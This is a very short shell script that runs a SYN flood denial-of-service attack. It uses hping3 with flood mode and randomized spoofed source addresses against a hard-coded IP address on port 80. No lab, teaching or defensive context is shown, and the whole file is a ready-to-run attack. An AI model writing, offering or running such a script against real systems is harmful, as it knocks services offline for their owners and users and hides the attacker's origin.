#!/bin/sh

IP=20.79.0.2
PORT=80
echo "Running SYN Flood on $IP:$PORT..."

hping3 -S -q -n --flood -V --rand-source $IP -p $PORT